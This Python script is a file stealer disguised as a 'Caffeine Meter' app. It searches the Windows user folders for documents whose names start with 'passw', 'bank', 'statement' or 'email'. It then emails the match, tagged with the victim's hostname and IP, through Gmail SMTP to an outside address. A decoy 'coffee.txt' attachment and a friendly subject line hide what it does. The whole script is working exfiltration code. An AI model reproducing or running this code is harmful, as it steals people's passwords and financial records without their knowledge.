import smtplib
import socket
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

def milk(folder):
    file_list = ""
    for paths, dirs, files in os.walk(folder):
        for file in files:
            if file.endswith(".txt") or file.endswith(".pdf") or file.endswith(".doc") or file.endswith(".docx"):
                if file.startswith("passw") or file.startswith("bank") or file.startswith(
                        "statement") or file.startswith("email"):
                    file_list = (os.path.join(paths, file))
    return file_list

def getPcName():
    hostname = socket.gethostname()
    IP = socket.gethostbyname(hostname)
    userid = hostname +' @ '+ IP
    return userid


folder = "C:\\Users"

email_username = 'youremail@here.com'
email_password = 'your_password'

email_receiver = 'caffeinemeter@gmail.com'

subject = 'Good Morning from: ' + getPcName()

body = "Here's your daily caffeine intake form our Caffeine Meter"

filename = milk(folder)
filename2 = "coffee.txt"

def sendMail(email_username, email_password, email_receiver, subject, body, filename):
    msg = MIMEMultipart()
    msg['From'] = email_username
    msg['To'] = email_receiver
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))
    attachment = open(filename, 'rb')

    # The attachment code

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename=" + filename)

    msg.attach(part)

    text = msg.as_string()

    # Connecting to server
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()

    # Server login
    server.login(email_username, email_password)

    # Server sending the mail
    server.sendmail(email_username, email_receiver, text)

    server.quit()

sendMail(email_username,email_password,email_receiver,subject,body, filename)

sendMail(email_username,email_password,email_receiver,subject,body, filename2)
